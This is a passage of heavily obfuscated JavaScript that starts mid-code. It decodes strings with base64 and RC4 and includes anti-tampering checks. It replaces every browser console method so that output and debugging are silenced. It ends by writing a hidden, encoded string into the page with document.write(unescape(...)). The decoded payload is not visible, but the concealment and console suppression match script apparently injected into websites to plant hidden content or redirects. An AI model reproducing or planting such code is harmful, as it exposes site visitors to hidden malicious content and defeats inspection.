n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['pwSzdv']=g;b['FHYCZA']={};b['KyesdD']=!![];}var f=b['FHYCZA'][c];if(f===undefined){if(b['ofguEY']===undefined){var h=function(i){this['XPARKA']=i;this['SpQSlz']=[0x1,0x0,0x0];this['GnmFej']=function(){return'newState';};this['QkHizH']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['gXalrj']='[\x27|\x22].+[\x27|\x22];?\x20*}';};h['prototype']['qxjHTI']=function(){var i=new RegExp(this['QkHizH']+this['gXalrj']);var j=i['test'](this['GnmFej']['toString']())?--this['SpQSlz'][0x1]:--this['SpQSlz'][0x0];return this['nPEtwj'](j);};h['prototype']['nPEtwj']=function(i){if(!Boolean(~i)){return i;}return this['KgZUjW'](this['XPARKA']);};h['prototype']['KgZUjW']=function(j){for(var k=0x0,l=this['SpQSlz']['length'];k<l;k++){this['SpQSlz']['push'](Math['round'](Math['random']()));l=this['SpQSlz']['length'];}return j(this['SpQSlz'][0x0]);};new h(b)['qxjHTI']();b['ofguEY']=!![];}e=b['pwSzdv'](e,d);b['FHYCZA'][c]=e;}else{e=f;}return e;};var f=function(){var h={};h[b('0x6','7Dxc')]=function(k,l){return k===l;};h[b('0x61','a%oA')]='YbZMj';h['cRxxV']=b('0x12','wF91');h[b('0x14','wF91')]=b('0x48','COhn');var i=h;var j=!![];return function(k,l){var m={};m[b('0x1d','Lo@q')]=i[b('0x54','$VHR')];var n=m;var o=j?function(){if(l){if(i[b('0x18','U5mN')](i[b('0x2f',')DXv')],i[b('0x5','LX^G')])){var r=n[b('0x4a','L1Y&')][b('0x20','Lyt0')]('|');var s=0x0;while(!![]){switch(r[s++]){case'0':t['log']=func;continue;case'1':t[b('0x63','Is#S')]=func;continue;case'2':return t;case'3':t[b('0x3b','FOKP')]=func;continue;case'4':t['trace']=func;continue;case'5':t['exception']=func;continue;case'6':t[b('0x10','(JP]')]=func;continue;case'7':t['debug']=func;continue;case'8':t['table']=func;continue;case'9':var t={};continue;}break;}}else{var p=l[b('0x2','G6f@')](k,arguments);l=null;return p;}}}:function(){};j=![];return o;};}();var e=f(this,function(){var h={};h['gHrTf']=function(k,l){return k!==l;};h[b('0x42','U5mN')]=b('0x8','QhWC');h[b('0x64','K1$*')]=b('0x45',')DXv');h['akRhn']=function(k){return k();};var i=h;var j=function(){if(i[b('0x36','a%oA')](i[b('0x55','sWxZ')],i['HOBsm'])){var m=fn[b('0x1c','no2k')](context,arguments);fn=null;return m;}else{var k=j[b('0x21','gppR')](i[b('0x3a',')@iy')])()[b('0x1e','sJRr')]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!k[b('0x41','pizW')](e);}};return i[b('0x3e','DccT')](j);});e();var d=function(){var h={};h['EXaez']=function(k,l){return k===l;};h[b('0x25','S7WR')]=b('0x46','9qRx');h['rXcSJ']=function(k,l){return k!==l;};h['FYmHz']=b('0x4f','6Xv9');var i=h;var j=!![];return function(k,l){var m={};m[b('0xf','%YCE')]=function(p,q){return i['EXaez'](p,q);};m['sYoxR']=i[b('0x24','qCYr')];m['XtOUU']=b('0xd','eo4*');var n=m;if(i[b('0x5f','(JP]')](i[b('0xe','U5mN')],b('0x44','sJRr'))){var o=j?function(){if(n[b('0x53',')Yx7')](n[b('0x43','5y70')],b('0x2b','L1Y&'))){if(l){var p=l[b('0x37','Lyt0')](k,arguments);l=null;return p;}}else{var r=j?function(){if(l){var s=l['apply'](k,arguments);l=null;return s;}}:function(){};j=![];return r;}}:function(){};j=![];return o;}else{var q=test['constructor'](b('0x38','K1$*'))()[b('0x30','C[x2')](n[b('0x5b',')@iy')]);return!q[b('0x4c','QhWC')](e);}};}();var c=d(this,function(){var h={};h[b('0x1f','Is#S')]=function(o,p){return o(p);};h['toGEl']=function(o,p){return o+p;};h['zAwGu']=function(o){return o();};h[b('0x1b','Qx0k')]=function(o,p){return o!==p;};h[b('0x33','QhWC')]=b('0x3','QhWC');h['UAJgG']=b('0x56','P2iv');h[b('0x22','no2k')]=b('0x40','QhWC');h[b('0x32','Is#S')]=b('0x5e','DccT');h[b('0x5a','9sO)')]=function(o,p){return o(p);};h['mlNWi']='{}.constructor(\x22return\x20this\x22)(\x20)';h[b('0x28','COhn')]=function(o,p){return o!==p;};h[b('0x5c','U5mN')]='AXmVx';var i=h;var j=function(){};var k;try{var l=i[b('0x4b','qCYr')](Function,i[b('0x2c','Is#S')](b('0x27','K1$*'),i['mlNWi'])+');');k=i[b('0x3d','qCYr')](l);}catch(o){k=window;}if(!k[b('0x29','3B1d')]){k['console']=function(p){if(i[b('0xc','LX^G')](i[b('0x60','pizW')],i[b('0x9','9qRx')])){var u=i[b('0x65','QhWC')](Function,i['toGEl'](i[b('0x1','K1$*')]('return\x20(function()\x20',b('0xa','0uLu')),');'));k=i[b('0x62','wF91')](u);}else{var q=i[b('0x2a','3B1d')][b('0x0','ixyG')]('|');var r=0x0;while(!![]){switch(q[r++]){case'0':s['exception']=p;continue;case'1':s[b('0x23','pizW')]=p;continue;case'2':s[b('0x3f','Is#S')]=p;continue;case'3':s['debug']=p;continue;case'4':var s={};continue;case'5':s[b('0x50','bi5R')]=p;continue;case'6':return s;case'7':s[b('0x49','6Xv9')]=p;continue;case'8':s[b('0x34','Ng&Q')]=p;continue;case'9':s[b('0x59','L1Y&')]=p;continue;}break;}}}(j);}else{if(i[b('0x5d','eo4*')](i[b('0x19','a%oA')],'hUGoc')){var m='1|5|2|4|0|3|7|6'[b('0x15','P2iv')]('|');var n=0x0;while(!![]){switch(m[n++]){case'0':k['console'][b('0x17','3B1d')]=j;continue;case'1':k[b('0x51',')DXv')][b('0x47','a%oA')]=j;continue;case'2':k[b('0x31','eo4*')]['debug']=j;continue;case'3':k[b('0x2d','6Xv9')][b('0x2e','ZeYJ')]=j;continue;case'4':k[b('0x4','wF91')][b('0x58','Lyt0')]=j;continue;case'5':k[b('0x4e','G6f@')]['warn']=j;continue;case'6':k['console']['trace']=j;continue;case'7':k[b('0x35','6AQ3')][b('0x1a','ixyG')]=j;continue;}break;}}else{var q={};q[b('0x26','3B1d')]=i[b('0x3c','e8v^')];q[b('0x4d','Lo@q')]=i[b('0xb','9qRx')];var r=q;var s=function(){var t=s[b('0x52','eo4*')](r[b('0x57','Lyt0')])()[b('0x11','pizW')](r[b('0x7','0Y9T')]);return!t[b('0x39','e8v^')](e);};return s();}}});c();document[b('0x16','wF91')](unescape(b('0x13','G6f@')));